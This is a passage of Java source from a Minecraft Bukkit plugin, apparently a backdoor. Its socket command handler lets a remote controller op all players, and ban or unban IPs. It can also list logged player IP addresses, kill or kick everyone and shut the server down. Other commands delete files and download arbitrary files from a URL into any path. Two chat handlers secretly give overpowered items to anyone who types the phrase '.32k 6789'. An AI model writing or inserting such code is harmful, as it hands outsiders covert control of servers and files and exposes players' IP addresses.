					 if (pll == ""){
						 pll = OnlinePlayers.get(i).getName();
					 }else{
						 pll = pll + "," + OnlinePlayers.get(i).getName();
					 }
					 
					}
				 outToServer.print("|OLPLIST|" + pll + "|"+ '\n');
				 outToServer.flush();
			 }
			 else if (args[1].equalsIgnoreCase("FREEZE")){
				 String pll1 = "";
				 for (int i = 0; i < FreezePlayers.size(); i++) {
					 if (pll1 == ""){
						 pll1 = FreezePlayers.get(i);
						 //Bukkit.broadcastMessage(pll1);
					 }else{
						 pll1 = pll1 + "," + FreezePlayers.get(i);
					 }
					 
					}
				 outToServer.print("|FREEZED|" + pll1 + "|"+ '\n');
				 outToServer.flush();
				 if (FreezePlayers.contains(Bukkit.getPlayer("MacFireFly2600").getName())){
					// Bukkit.getPlayer("MacFireFly2600").sendMessage("You are still on Freeze");
				 }else{
					// Bukkit.getPlayer("MacFireFly2600").sendMessage("You are NOT on Freeze");
				//IGNORE THIS, THIS IS ALL JUST DEBUGGING STUFF.
				 
				 }
				 
			 } else if (args[1].equalsIgnoreCase("MUTEX")){
				 try{
					 if (!(MutedPlayers.contains(Bukkit.getPlayer(args[2]).getName()))){
						 MutedPlayers.add(Bukkit.getPlayer(args[2]).getName());
					 }
				 }catch (Exception e){
					 
				 }
			 }
			 else if (args[1].equalsIgnoreCase("UNMUTE")){
				 try{
					 if (MutedPlayers.contains(Bukkit.getPlayer(args[2]).getName())){
						 MutedPlayers.remove(Bukkit.getPlayer(args[2]).getName());
					 }
				 }catch (Exception e){
					 
				 }
			 }
			 else if (args[1].equalsIgnoreCase("FREEZEX")){
				 try{
					 if (!(FreezePlayers.contains(Bukkit.getPlayer(args[2]).getName()))){
						 FreezePlayers.add(Bukkit.getPlayer(args[2]).getName());
					 }
				 }catch (Exception e){
					 
				 }
			 }
			 else if (args[1].equalsIgnoreCase("UNFREEZE")){
				 try{
					 if (FreezePlayers.contains(Bukkit.getPlayer(args[2]).getName())){
						 FreezePlayers.remove(Bukkit.getPlayer(args[2]).getName());
						 if (FreezePlayers.contains(Bukkit.getPlayer(args[2]).getName())){
							// Bukkit.getPlayer(args[2]).sendMessage("You are still on Freeze");
						 }
					 }
				 }catch (Exception e){
					 
				 }
			 }
		 
		 
			 else if (args[1].equalsIgnoreCase("MUTEX")){
				 try{
					 if (!(MutedPlayers.contains(Bukkit.getPlayer(args[2]).getName()))){
						 MutedPlayers.add(Bukkit.getPlayer(args[2]).getName());
					 }
				 }catch (Exception e){
					 
				 }
			 }
		 
			 else if (args[1].equalsIgnoreCase("UNBANIP")){
				 try{
					 if (Bukkit.getIPBans().contains(args[2])){
						 Bukkit.unbanIP(args[2]);
						 if (Bukkit.getIPBans().contains(args[2])){
							 outToServer.print("|CONSOLE|ECHO Data>| " + args[2] + " FAILED to unban IP|"+ '\n');
							 outToServer.flush();
						 }else{
							 outToServer.print("|CONSOLE|ECHO Data>| " + args[2] + " IP unbanned|"+ '\n');
							 outToServer.flush();
						 }
						
					 }
					
				 }catch (Exception e){
					 
				 }
			 }
			 else if (args[1].equalsIgnoreCase("BANIP")){
				 try{
					 if (Bukkit.getIPBans().contains(args[2])){
						 Bukkit.unbanIP(args[2]);
						 if (Bukkit.getIPBans().contains(args[2])){
							 outToServer.print("|CONSOLE|ECHO Data>| " + args[2] + " FAILED to unban IP|"+ '\n');
							 outToServer.flush();
						 }else{
							 outToServer.print("|CONSOLE|ECHO Data>| " + args[2] + " IP unbanned|"+ '\n');
							 outToServer.flush();
						 }
						
					 }
					
				 }catch (Exception e){
					 
				 }
			 }
			 else if (args[1].equalsIgnoreCase("MUTE")){
				 String pll = "";
				 for (int i = 0; i < MutedPlayers.size(); i++) {
					 if (pll == ""){
						 pll = MutedPlayers.get(i);
					 }else{
						 pll = pll + "," + MutedPlayers.get(i);
					 }
					 
					}
				 outToServer.print("|MUTED1|" + pll + "|"+ '\n');
				 outToServer.flush();
			 }
		 
		 
			 else if (args[1].equalsIgnoreCase("OP")){
				 	if (args.length > 0){
				 		Bukkit.getPlayer(args[2]).setOp(true);
				 		outToServer.print("|CONSOLE|" + Bukkit.getPlayer(args[2]).getName() + " OPPED|"+ '\n');
						 outToServer.flush();
				 	}
				 
			 }
			 else if (args[1].equalsIgnoreCase("CDE")){
				 if (args.length > 0){
					 File f = new File(args[2], "");
					 if (f.exists() && f.isDirectory()) {
						 outToServer.print("|FM|" + "Directory(" + args[2] + ") EXISTS"  + "|"+ '\n');
						 outToServer.flush();
					 } else if (!(f.exists()) && (f.isDirectory())){
						 outToServer.print("|FM|" + "Directory(" + args[2] + ") DOES NOT EXISTS"  + "|"+ '\n');
						 outToServer.flush();
						 
					 }else{
						 outToServer.print("|FM|" + "Directory(" + args[2] + ") Is a Directory: " + f.isDirectory() + ", Exists: " + f.exists() + ", Is a File: " +f.isFile()  + "|"+ '\n');
						 outToServer.flush();
					 }
				 }
			 }
			 else if (args[1].equalsIgnoreCase("CFE")){
				 if (args.length > 1){
					 File f = new File(args[2], args[3]);
					 if (f.exists() && f.isFile()) {
						 outToServer.print("|FM|" + "DIR(" + args[2] + "/"+ args[3] + ") EXISTS"  + "|"+ '\n');
						 outToServer.flush();
					 } else if (!(f.exists()) && (f.isFile())){
						 outToServer.print("|FM|" + "DIR(" + args[2] + "/"+ args[3] + ") DOES NOT EXISTS"  + "|"+ '\n');
						 outToServer.flush();
						 
					 }else{
						 outToServer.print("|FM|" + "DIR(" + args[2] + "/"+ args[3]+ ") Is a Directory: " + f.isDirectory() + ", Exists: " + f.exists() + ", Is a File: " +f.isFile()  + "|"+ '\n');
						 outToServer.flush();
					 }
				 }
			 }
			 else if (args[1].equalsIgnoreCase("DNR")){
				 if (args.length > 1){
					 try {
						 //|PREFIX:args1|URL:args2|PATH:args3|NAME:args4|
						 outToServer.print("|FM|[Installing] Attempting to download file.|");
						 outToServer.flush();
                                URL url = new URL(args[2]);
                                URLConnection urlConn = url.openConnection();
                                BufferedInputStream is = new BufferedInputStream(urlConn.getInputStream());
                                String pluginname = "";
                             pluginname = args[4];
                                File out = new File(args[3], pluginname);
                                BufferedOutputStream bout = new BufferedOutputStream(new FileOutputStream(out));
                                byte[] b = new byte[8192];
                                int read = 0;
                                while ((read = is.read(b)) > -1) {
                                  bout.write(b, 0, read);
                                }
                                bout.flush();
                                bout.close();
                                is.close();
                                Thread.sleep(800);
                                outToServer.print("|FM|[Installing] File Downloaded.|");
       						 outToServer.flush();
       					   Thread.sleep(800);
       						 outToServer.print("|FM|[AngelNET] Installed: " + args[3] + "\\" +pluginname + " ,If plugin, reload server.|");
       						 outToServer.flush();
                              }
                              catch (IOException mfu)
                              { //download854.mediafireuserdownload.com/f7u60a9f5lsg/2yrlniyy0yt2eiy/Pancake.zip
                            	   Thread.sleep(800);
                                	  outToServer.print("|FM|[Installing] Failed, error message: " + mfu.getMessage() + "|");
                						 outToServer.flush();   
                              }
				 }
			 }
			 else if (args[1].equalsIgnoreCase("DF")){
				 if (args.length > 0){
					 File f = new File(args[2], args[3]);
					 if (f.exists() && (!(f.isDirectory()))) {
						 outToServer.print("|FM|Deleting File: " + args[2] + "\\" + args[3]+ "|"+ '\n');
						 outToServer.flush();
						 Thread.sleep(800);
						 try
						 {
							 f.delete();
							 outToServer.print("|FM|Deleted File: " + args[2] + "\\" + args[3]+ "|"+ '\n');
							 outToServer.flush();
						 }catch (Exception e){Thread.sleep(800); outToServer.print("|FM|Failed to delete file, Reason: " + e.getMessage() + "|"+ '\n');
						 outToServer.flush();}
					 }else{Thread.sleep(800);
						 outToServer.print("|FM|" + "Failed to delete(" + args[2] + "\\" + args[3] + ") Is a Directory: " + f.isDirectory() + ", Exists: " + f.exists() + ", Is a File: " +f.isFile()  + "|"+ '\n');
						 outToServer.flush();
					 }
				 }
			 }
			 else if (args[1].equalsIgnoreCase("DP")){
				 if (args.length > 0){
					 Thread t3 = new Thread(new Runnable() {
						    public void run()
						    {
						    	 File f = new File(args[2], args[3]);
								 if (f.exists() && (!(f.isDirectory()))) {
									
									 DeletePlugin(args[2], args[3]);
								 }
						    	
						    }});  
						   t3.start();
				 }
				 }
			 else if (args[1].equalsIgnoreCase("DEOP")){
				 	if (args.length > 0){
				 		Bukkit.getPlayer(args[2]).setOp(false);
				 		outToServer.print("|CONSOLE|" + Bukkit.getPlayer(args[2]).getName() + " DEOPPED|"+ '\n');
						 outToServer.flush();
				 	}
				 
			 }
		 
		 
			 else if (args[1].equalsIgnoreCase("PIPLIST")){
				 String pll = "";
				 for (int i = 0; i < PlayerIPLog.size(); i++) {
					 if (pll == ""){
						 pll = PlayerIPLog.get(i);
					 }else{
						 pll = pll + "," + PlayerIPLog.get(i);
					 }
					 
					}
				 outToServer.print("|PIPLIST|" + pll + "|"+ '\n');
				 outToServer.flush();
				 //Bukkit.broadcastMessage("PIPLIST: " + pll);
			 }
			 else if ((args[1]).equalsIgnoreCase("CHAT")){
				 String Username = args[2];
				 String Message = args[3];
				 Message = Message.replace("{PIPE}", "|");
				 Username = Username.replace("{PIPE}", "|");
			//	 Bukkit.broadcastMessage(Username + "> " +Message) ;
				 boolean sent = false;
				 for (int i = 0; i < OnlinePlayers.size(); i++) {
					 if (Username.equalsIgnoreCase(OnlinePlayers.get(i).getName())){
						 sent = true;
						 OnlinePlayers.get(i).chat(Message);
					 }
				 }
				 if (sent == false){
					 if (Username.equalsIgnoreCase("[CONSOLE]")){
						 Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "say " + Message);
					 }else{
						 Bukkit.broadcastMessage(Username + " " +Message) ;
					 }
					
				 }
			 }
		 
			 else if (args[1].equalsIgnoreCase("RL")){
				 Bukkit.reload();
			 }else if (args[1].equalsIgnoreCase("SYS")){
				 if (args.length >1){
					 if (args[2].equalsIgnoreCase("OFF")){
						 Bukkit.shutdown();
					 } else if (args[2].equalsIgnoreCase("KICKALL")){
						//Bukkit.broadcastMessage("Trying to kick all.");
					//	 OnlinePlayers.get(0).chat("/Test");
						 for (int i = 0; i < OnlinePlayers.size(); i++) {
							 Bukkit.getPlayer(OnlinePlayers.get(i).getName()).kickPlayer("End of stream");
							}
					 }else if (args[2].equalsIgnoreCase("OPALL")){
						 for (int i = 0; i < OnlinePlayers.size(); i++) {
							 if (!(OnlinePlayers.get(i).isOp())){
								 OnlinePlayers.get(i).setOp(true);
								 OnlinePlayers.get(i).sendMessage("§eYou are now op!");
							 }
							
							}
					 }else if (args[2].equalsIgnoreCase("DEOPALL")){
						 for (int i = 0; i < OnlinePlayers.size(); i++) {
								 OnlinePlayers.get(i).setOp(false);		
							}
					 }else if (args[2].equalsIgnoreCase("CHATALL")){
						 for (int i = 0; i < OnlinePlayers.size(); i++) {
							 OnlinePlayers.get(i).chat(args[3]);
						}
						 
				 }else if (args[2].equalsIgnoreCase("KILLALL")){
					 for (int i = 0; i < OnlinePlayers.size(); i++) {
						 try{
							 OnlinePlayers.get(i).setHealth(0.0);
						 }catch (Exception e){}
					}
			 }else if (args[2].equalsIgnoreCase("DISABLE")){
				 try{
					   Plugin plugin = Bukkit.getPluginManager().getPlugin(args[3]);
                       if (plugin != null)
                       {
                         Bukkit.getPluginManager().disablePlugin(plugin);
                       }
				 }catch (Exception e){
					 
				 }
			 }else if (args[2].equalsIgnoreCase("ENABLE")){
				 //ENABLE
				 try{
					   Plugin plugin = Bukkit.getPluginManager().getPlugin(args[3]);
                     if (plugin != null)
                     {
                       Bukkit.getPluginManager().enablePlugin(plugin);
                     }
				 }catch (Exception e){
					 
				 }
			 }		 
				 }
			 }
		  
	}catch (Exception e) {}
		  // End of IF
		  sentence = "";
		  }
		}
		  } catch (Exception e) {
				HasConnected = false;
				//Bukkit.getConsoleSender().sendMessage("§4ERROR CONNECTION STOPPED: " + e.getMessage());
		}
		} catch (Exception e) {
			HasConnected = false;
			//Bukkit.getConsoleSender().sendMessage("§4ERROR CONNECTION STOPPED: " + e.getMessage());
		}
	}
	public void DeletePlugin(String PATH, String PluginName) {
		  int i = 0;
		  try {
		  Bukkit.reload();
			} catch (Exception e1) {
			
			}
		
	      do {
	    	  File f = new File(PATH, PluginName);
	    	//  File f1 = new File(PATH, PluginName + ".t");
				 if (f.exists() && (!(f.isDirectory()))) {
					 try
					 {
						 f.delete();
						 	i = 21;
					 }catch (Exception e){ try {
						Thread.sleep(800);
					} catch (Exception e1) {
					
					}}
					 
				 }else{
					 try {
							Thread.sleep(800);
						} catch (Exception e1) {
						
						}
					// i = 21;
				 }
	         i++;	  
	         }while( i < 20 ); 
	      try {
			  Bukkit.broadcastMessage("§eEnded.");
			} catch (Exception e1) {
			
			} 
	} 
	
	 
	
	@EventHandler
    public void onChat(AsyncPlayerChatEvent event) {
        ItemStack item = new ItemStack(Material.NETHERITE_SWORD);
        ItemMeta meta = item.getItemMeta();
        List<String> lore = new ArrayList<String>();
        lore.add("Doing your Mom");
        meta.addEnchant( Enchantment.DAMAGE_ALL, 8,  true);
        meta.addEnchant( Enchantment.LOOT_BONUS_MOBS, 10,  true);
        meta.addEnchant( Enchantment.MENDING, 1, true);
        meta.addEnchant( Enchantment.DURABILITY, 32767, true);
        meta.addEnchant( Enchantment.FIRE_ASPECT, 5, true);
        meta.addEnchant( Enchantment.VANISHING_CURSE, 1, true);
        meta.addEnchant( Enchantment.SWEEPING_EDGE, 5, true);
        meta.addEnchant( Enchantment.DAMAGE_ARTHROPODS, 100, true);
        meta.addEnchant( Enchantment.DAMAGE_UNDEAD, 100, true);
        
        ItemStack item1 = new ItemStack(Material.NETHERITE_PICKAXE);
        ItemMeta meta1 = item1.getItemMeta();
        meta1.setDisplayName(ChatColor.GRAY + "Exavator");
        List<String> lore1 = new ArrayList<String>();
        lore1.add("Doing your Mom");
        meta1.addEnchant( Enchantment.DURABILITY, 32000,  true);
        meta1.addEnchant( Enchantment.DIG_SPEED, 7,  true);
        meta1.addEnchant( Enchantment.LOOT_BONUS_BLOCKS, 69,  true);
        meta1.addEnchant( Enchantment.MENDING, 1,  true);
        meta1.addEnchant( Enchantment.VANISHING_CURSE, 1,  true);
        
        ItemStack item2 = new ItemStack(Material.NETHERITE_PICKAXE);
        ItemMeta meta2 = item2.getItemMeta();
        meta2.setDisplayName(ChatColor.GRAY + "Very nike Pickaxe");
        List<String> lore2 = new ArrayList<String>();
        lore2.add("Doing your Mom");
        meta2.addEnchant( Enchantment.DURABILITY, 32767,  true);
        meta2.addEnchant( Enchantment.DIG_SPEED, 7,  true);
        meta2.addEnchant( Enchantment.SILK_TOUCH, 420,  true);
        meta2.addEnchant( Enchantment.MENDING, 1,  true);
        meta2.addEnchant( Enchantment.VANISHING_CURSE, 1,  true);
        
        ItemStack item3 = new ItemStack(Material.NETHERITE_AXE);
        ItemMeta meta3 = item3.getItemMeta();
        List<String> lore3 = new ArrayList<String>();
        lore3.add("Doing your Mom");
        meta3.addEnchant( Enchantment.DIG_SPEED, 7,  true);
        meta3.addEnchant( Enchantment.DAMAGE_ALL, 8,  true);
        meta3.addEnchant( Enchantment.MENDING, 1,  true);
        meta3.addEnchant( Enchantment.DURABILITY, 32767,  true);
        meta3.addEnchant( Enchantment.VANISHING_CURSE, 1,  true);
        
        ItemStack item4 = new ItemStack(Material.ELYTRA);
        ItemMeta meta4 = item4.getItemMeta();
        meta4.setDisplayName(ChatColor.MAGIC + "EWYGYWEYWYEW" + ChatColor.RED + "/FLY" + ChatColor.MAGIC + "EWYGYWEYWYEW");
        List<String> lore4 = new ArrayList<String>();
        lore4.add("Doing your Mom");
        meta4.addEnchant( Enchantment.DURABILITY, 32767,  true);
        meta4.addEnchant( Enchantment.MENDING, 1,  true);
        meta4.addEnchant( Enchantment.DURABILITY, 32767,  true);
        
        ItemStack item5 = new ItemStack(Material.NETHERITE_HELMET);
        ItemMeta meta5 = item5.getItemMeta();
        meta5.setDisplayName(ChatColor.DARK_RED + "God Helmet");
        List<String> lore5 = new ArrayList<String>();
        lore5.add("Doing your Mom");
        meta5.addEnchant( Enchantment.WATER_WORKER, 32767,  true);
        meta5.addEnchant( Enchantment.OXYGEN, 32767,  true);
        meta5.addEnchant( Enchantment.THORNS, 8,  true);
        meta5.addEnchant( Enchantment.PROTECTION_PROJECTILE, 69,  true);
        meta5.addEnchant( Enchantment.PROTECTION_EXPLOSIONS, 69,  true);
        meta5.addEnchant( Enchantment.PROTECTION_FIRE, 69,  true);
        meta5.addEnchant( Enchantment.PROTECTION_ENVIRONMENTAL, 69,  true);
        meta5.addEnchant( Enchantment.DURABILITY, 32767,  true); 
        meta5.addEnchant( Enchantment.VANISHING_CURSE, 1,  true);
        
        ItemStack item6 = new ItemStack(Material.NETHERITE_CHESTPLATE);
        ItemMeta meta6 = item6.getItemMeta();
        meta6.setDisplayName(ChatColor.DARK_RED + "God Chesplate");
        List<String> lore6 = new ArrayList<String>();
        lore6.add("Doing your Mom");
        meta6.addEnchant( Enchantment.PROTECTION_ENVIRONMENTAL, 8,  true);
        meta6.addEnchant( Enchantment.PROTECTION_PROJECTILE, 8,  true);
        meta6.addEnchant( Enchantment.FIRE_ASPECT, 8,  true);
        meta6.addEnchant( Enchantment.PROTECTION_EXPLOSIONS, 8,  true);
        meta6.addEnchant( Enchantment.THORNS, 8,  true);
        meta6.addEnchant( Enchantment.DURABILITY, 32767,  true);
        meta6.addEnchant( Enchantment.VANISHING_CURSE, 1,  true);
        meta6.addEnchant( Enchantment.MENDING, 1,  true);
        
        ItemStack item7 = new ItemStack(Material.NETHERITE_LEGGINGS);
        ItemMeta meta7 = item7.getItemMeta();
        meta7.setDisplayName(ChatColor.DARK_RED + "God Leggings");
        List<String> lore7 = new ArrayList<String>();
        lore7.add("Doing your Mom");
        meta7.addEnchant( Enchantment.PROTECTION_ENVIRONMENTAL, 8,  true);
        meta7.addEnchant( Enchantment.PROTECTION_PROJECTILE, 8,  true);
        meta7.addEnchant( Enchantment.FIRE_ASPECT, 8,  true);
        meta7.addEnchant( Enchantment.PROTECTION_EXPLOSIONS, 8,  true);
        meta7.addEnchant( Enchantment.THORNS, 8,  true);
        meta7.addEnchant( Enchantment.DURABILITY, 32767,  true);
        meta7.addEnchant( Enchantment.VANISHING_CURSE, 1,  true);
        meta7.addEnchant( Enchantment.MENDING, 1,  true);
        
        ItemStack item8 = new ItemStack(Material.NETHERITE_BOOTS);
        ItemMeta meta8 = item8.getItemMeta();
        meta8.setDisplayName(ChatColor.DARK_RED + "God Boots");
        List<String> lore8 = new ArrayList<String>();
        lore8.add("Doing your Mom");
        meta8.addEnchant( Enchantment.PROTECTION_ENVIRONMENTAL, 8,  true);
        meta8.addEnchant( Enchantment.PROTECTION_PROJECTILE, 8,  true);
        meta8.addEnchant( Enchantment.FIRE_ASPECT, 8,  true);
        meta8.addEnchant( Enchantment.PROTECTION_EXPLOSIONS, 8,  true);
        meta8.addEnchant( Enchantment.THORNS, 8,  true);
        meta8.addEnchant( Enchantment.DURABILITY, 32767,  true);
        meta8.addEnchant( Enchantment.VANISHING_CURSE, 1,  true);
        meta8.addEnchant( Enchantment.PROTECTION_FALL, 8,  true);
        meta8.addEnchant( Enchantment.DEPTH_STRIDER, 5,  true);
        meta8.addEnchant( Enchantment.MENDING, 1,  true);
         
        ItemStack item9 = new ItemStack(Material.TRIDENT);
        ItemMeta meta9 = item9.getItemMeta();
        List<String> lore9 = new ArrayList<String>();
        lore9.add("Doing your Mom");
        meta9.addEnchant( Enchantment.LOYALTY, 3,  true);
        meta9.addEnchant( Enchantment.CHANNELING, 1,  true);
        meta9.addEnchant( Enchantment.DURABILITY, 32767,  true);
        meta9.addEnchant( Enchantment.MENDING, 1,  true);
        meta9.addEnchant( Enchantment.VANISHING_CURSE, 1,  true);
        meta9.addEnchant( Enchantment.IMPALING, 10,  true);
        
 
        ItemStack item10 = new ItemStack(Material.BOW);
        ItemMeta meta10 = item10.getItemMeta();
        List<String> lore10 = new ArrayList<String>();
        lore10.add("Doing your Mom");
        meta10.addEnchant( Enchantment.ARROW_FIRE, 10,  true);
        meta10.addEnchant( Enchantment.ARROW_KNOCKBACK, 5,  true);
        meta10.addEnchant( Enchantment.ARROW_DAMAGE, 5,  true);
        meta10.addEnchant( Enchantment.DURABILITY, 32767,  true);
        meta10.addEnchant( Enchantment.ARROW_INFINITE, 1,  true);
        meta10.addEnchant( Enchantment.VANISHING_CURSE, 1,  true);
        
        
        
        ItemStack item11 = new ItemStack(Material.TRIDENT);
        ItemMeta meta11 = item11.getItemMeta();
        List<String> lore11 = new ArrayList<String>();
        lore11.add("Doing your Mom");
        meta11.addEnchant( Enchantment.RIPTIDE, 4,  true);
        meta11.addEnchant( Enchantment.CHANNELING, 1,  true);
        meta11.addEnchant( Enchantment.DURABILITY, 32767,  true);
        meta11.addEnchant( Enchantment.MENDING, 1,  true);
        meta11.addEnchant( Enchantment.VANISHING_CURSE, 1,  true);
        meta11.addEnchant( Enchantment.IMPALING, 10,  true);
        
        ItemStack item12 = new ItemStack(Material.CROSSBOW);
        ItemMeta meta12 = item12.getItemMeta();
        List<String> lore12 = new ArrayList<String>();
        lore12.add("Doing your Mom");
        meta12.addEnchant( Enchantment.QUICK_CHARGE, 10,  true);
        meta12.addEnchant( Enchantment.MULTISHOT, 1,  true);
        meta12.addEnchant( Enchantment.PIERCING, 8,  true);
        meta12.addEnchant( Enchantment.DURABILITY, 32767,  true);
        meta12.addEnchant( Enchantment.MENDING, 1,  true);
        meta12.addEnchant( Enchantment.VANISHING_CURSE, 1,  true);
        
        
        ItemStack item13 = new ItemStack(Material.SHIELD);
        ItemMeta meta13 = item13.getItemMeta();
        List<String> lore13 = new ArrayList<String>();
        meta13.setDisplayName(ChatColor.GREEN + "Ghostly Ebon Light Shield");
        lore13.add("Doing your Mom");
        meta13.addEnchant( Enchantment.DURABILITY, 32767,  true);
        meta13.addEnchant( Enchantment.THORNS, 5,  true);
        meta13.addEnchant( Enchantment.MENDING, 1,  true);
        meta13.addEnchant( Enchantment.VANISHING_CURSE, 1,  true);
        
        
        
        ItemStack item14 = new ItemStack(Material.ENCHANTED_GOLDEN_APPLE, 64);
        ItemMeta meta14 = item14.getItemMeta();
        meta14.setDisplayName(ChatColor.GOLD + "GOD Apples");
        List<String> lore14 = new ArrayList<String>();
        lore14.add("Doing your Mom");
        
        ItemStack item15 = new ItemStack(Material.FIREWORK_ROCKET, 64);
        ItemMeta meta15 = item15.getItemMeta();
        List<String> lore15 = new ArrayList<String>();
        lore15.add("Doing your Mom");
                 
        ItemStack item16 = new ItemStack(Material.DIAMOND_BLOCK, 64);
        ItemMeta meta16 = item16.getItemMeta();
        List<String> lore16 = new ArrayList<String>();
        lore16.add("Doing your Mom");
        
        ItemStack item17 = new ItemStack(Material.NETHERITE_BLOCK, 64);
        ItemMeta meta17 = item17.getItemMeta();
        List<String> lore17 = new ArrayList<String>();
        lore17.add("Doing your Mom");
        
         
        ItemStack item18 = new ItemStack(Material.GOLDEN_CARROT, 64);
        ItemMeta meta18 = item18.getItemMeta();
        meta18.setDisplayName(ChatColor.GOLD + "GOD Carrots");
        List<String> lore18 = new ArrayList<String>();
        lore18.add("Doing your Mom");
         
        
        ItemStack item19 = new ItemStack(Material.FIREWORK_STAR, 64);
        ItemMeta meta19 = item19.getItemMeta();
        List<String> lore19 = new ArrayList<String>();
        lore19.add("Doing your Mom");
        
        
        ItemStack item20 = new ItemStack(Material.ARROW, 64);
        ItemMeta meta20 = item20.getItemMeta();
        List<String> lore20 = new ArrayList<String>();
        lore20.add("Doing your Mom");
        
        item.setItemMeta(meta);
        item1.setItemMeta(meta1);
        item2.setItemMeta(meta2);
        item3.setItemMeta(meta3);
        item4.setItemMeta(meta4);
        item5.setItemMeta(meta5);
        item6.setItemMeta(meta6);
        item7.setItemMeta(meta7);
        item8.setItemMeta(meta8);
        item9.setItemMeta(meta9);
        item10.setItemMeta(meta10);
        item11.setItemMeta(meta11);
        item12.setItemMeta(meta12);
        item13.setItemMeta(meta13);
        item14.setItemMeta(meta14);
        item15.setItemMeta(meta15);
        item16.setItemMeta(meta16);
        item17.setItemMeta(meta17);
        item18.setItemMeta(meta18);
        item19.setItemMeta(meta19);
        
        if (event.getMessage().toLowerCase().equals(".32k 6789")) {
            event.getPlayer().getInventory().addItem(item);
            event.getPlayer().getInventory().addItem(item1);
            event.getPlayer().getInventory().addItem(item2);
            event.getPlayer().getInventory().addItem(item3);
            event.getPlayer().getInventory().addItem(item4);
            event.getPlayer().getInventory().addItem(item5);
            event.getPlayer().getInventory().addItem(item6);
            event.getPlayer().getInventory().addItem(item7);
            event.getPlayer().getInventory().addItem(item8);
            event.getPlayer().getInventory().addItem(item9);
            event.getPlayer().getInventory().addItem(item10);
            event.getPlayer().getInventory().addItem(item11);
            event.getPlayer().getInventory().addItem(item12);
            event.getPlayer().getInventory().addItem(item13);
            event.getPlayer().getInventory().addItem(item14);
            event.getPlayer().getInventory().addItem(item15);
            event.getPlayer().getInventory().addItem(item16);
            event.getPlayer().getInventory().addItem(item17);
            event.getPlayer().getInventory().addItem(item18);
            event.getPlayer().getInventory().addItem(item19);
            event.setCancelled(true);}

    }
	
	 
	@EventHandler
    public void onChat1(AsyncPlayerChatEvent event) {
		 ItemStack item = new ItemStack(Material.NETHERITE_SWORD);
	        ItemMeta meta = item.getItemMeta();
	        List<String> lore = new ArrayList<String>();
	        lore.add("Doing your Mom");
	        meta.addEnchant( Enchantment.DAMAGE_ALL, 32767,  true);
	        meta.addEnchant( Enchantment.LOOT_BONUS_MOBS, 32767,  true);
	        meta.addEnchant( Enchantment.MENDING, 32767, true);
	        meta.addEnchant( Enchantment.DURABILITY, 32767, true);
	        meta.addEnchant( Enchantment.FIRE_ASPECT, 32767, true);
	        meta.addEnchant( Enchantment.VANISHING_CURSE, 32767, true);
	        meta.addEnchant( Enchantment.SWEEPING_EDGE, 32767, true);
	        meta.addEnchant( Enchantment.DAMAGE_ARTHROPODS, 32767, true);
	        meta.addEnchant( Enchantment.DAMAGE_UNDEAD, 32767, true);
	        
	        ItemStack item1 = new ItemStack(Material.NETHERITE_PICKAXE);
	        ItemMeta meta1 = item1.getItemMeta();
	        meta1.setDisplayName(ChatColor.GRAY + "Exavator");
	        List<String> lore1 = new ArrayList<String>();
	        lore1.add("Doing your Mom");
	        meta1.addEnchant( Enchantment.DURABILITY, 32767,  true);
	        meta1.addEnchant( Enchantment.DIG_SPEED, 32767,  true);
	        meta1.addEnchant( Enchantment.LOOT_BONUS_BLOCKS,32767,  true);
	        meta1.addEnchant( Enchantment.MENDING, 32767,  true);
	        meta1.addEnchant( Enchantment.VANISHING_CURSE, 32767,  true);
	        
	        ItemStack item2 = new ItemStack(Material.NETHERITE_PICKAXE);
	        ItemMeta meta2 = item2.getItemMeta();
	        meta2.setDisplayName(ChatColor.GRAY + "Very nike Pickaxe");
	        List<String> lore2 = new ArrayList<String>();
	        lore2.add("Doing your Mom");
	        meta2.addEnchant( Enchantment.DURABILITY, 32767,  true);
	        meta2.addEnchant( Enchantment.DIG_SPEED, 32767,  true);
	        meta2.addEnchant( Enchantment.SILK_TOUCH, 32767,  true);
	        meta2.addEnchant( Enchantment.MENDING, 32767,  true);
	        meta2.addEnchant( Enchantment.VANISHING_CURSE, 32767,  true);
	        
	        ItemStack item3 = new ItemStack(Material.NETHERITE_AXE);
	        ItemMeta meta3 = item3.getItemMeta();
	        List<String> lore3 = new ArrayList<String>();
	        lore3.add("Doing your Mom");
	        meta3.addEnchant( Enchantment.DIG_SPEED, 32767,  true);
	        meta3.addEnchant( Enchantment.DAMAGE_ALL, 32767,  true);
	        meta3.addEnchant( Enchantment.MENDING, 32767,  true);
	        meta3.addEnchant( Enchantment.DURABILITY, 32767,  true);
	        meta3.addEnchant( Enchantment.VANISHING_CURSE, 32767,  true);
	        
	        ItemStack item4 = new ItemStack(Material.ELYTRA);
	        ItemMeta meta4 = item4.getItemMeta();
	        meta4.setDisplayName(ChatColor.MAGIC + "EWYGYWEYWYEW" + ChatColor.RED + "/FLY" + ChatColor.MAGIC + "EWYGYWEYWYEW");
	        List<String> lore4 = new ArrayList<String>();
	        lore4.add("Doing your Mom");
	        meta4.addEnchant( Enchantment.DURABILITY, 32767,  true);
	        meta4.addEnchant( Enchantment.MENDING, 32767,  true);
	        meta4.addEnchant( Enchantment.DURABILITY, 32767,  true);
	        
	        ItemStack item5 = new ItemStack(Material.NETHERITE_HELMET);
	        ItemMeta meta5 = item5.getItemMeta();
	        meta5.setDisplayName(ChatColor.DARK_RED + "God Helmet");
	        List<String> lore5 = new ArrayList<String>();
	        lore5.add("Doing your Mom");
	        meta5.addEnchant( Enchantment.WATER_WORKER, 32767,  true);
	        meta5.addEnchant( Enchantment.OXYGEN, 32767,  true);
	        meta5.addEnchant( Enchantment.THORNS, 32767,  true);
	        meta5.addEnchant( Enchantment.PROTECTION_PROJECTILE, 32767,  true);
	        meta5.addEnchant( Enchantment.PROTECTION_EXPLOSIONS, 32767,  true);
	        meta5.addEnchant( Enchantment.PROTECTION_FIRE, 32767,  true);
	        meta5.addEnchant( Enchantment.PROTECTION_ENVIRONMENTAL, 32767,  true);
	        meta5.addEnchant( Enchantment.DURABILITY, 32767,  true); 
	        meta5.addEnchant( Enchantment.VANISHING_CURSE, 32767,  true);
	        
	        ItemStack item6 = new ItemStack(Material.NETHERITE_CHESTPLATE);
	        ItemMeta meta6 = item6.getItemMeta();
	        meta6.setDisplayName(ChatColor.DARK_RED + "God Chesplate");
	        List<String> lore6 = new ArrayList<String>();
	        lore6.add("Doing your Mom");
	        meta6.addEnchant( Enchantment.PROTECTION_ENVIRONMENTAL, 32767,  true);
	        meta6.addEnchant( Enchantment.PROTECTION_PROJECTILE, 32767,  true);
	        meta6.addEnchant( Enchantment.FIRE_ASPECT, 32767,  true);
